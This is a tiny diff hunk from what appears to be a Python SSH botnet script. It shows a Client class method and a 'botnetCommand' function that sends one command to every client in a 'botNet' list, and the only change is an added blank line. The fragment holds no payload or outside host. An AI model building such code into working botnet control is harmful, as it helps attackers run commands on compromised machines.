@@ -22,6 +22,7 @@ class Client:
         self.session.prompt()
         return self.session.before
 
+    
 def botnetCommand(command):
     for client in botNet:
         output = client.send_command(command)
